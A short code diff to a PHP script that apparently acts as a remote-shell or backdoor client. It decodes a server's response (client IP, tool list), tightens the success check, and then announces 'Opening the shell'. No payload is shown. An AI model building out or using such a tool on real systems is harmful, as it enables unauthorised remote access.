@@ -81,12 +81,15 @@ if ($result['status'] == 200) {
     $client_ip = base64_decode($response['client_ip']);
     $tools = explode('|', base64_decode($response['tools']));
     unset($response);
-    $continue = true;
-    echo "Done.\n";
+    if(strlen($time) != 0) {
+        $continue = true;
+        echo "Done.\n";
+    } else {
+        echo "Failed.\n";
+    }
 }
 
 if (!$continue) {
-    echo "Failed.\n\n";
     exit(-1);
 }
 echo " [+] Opening the shell... \n";
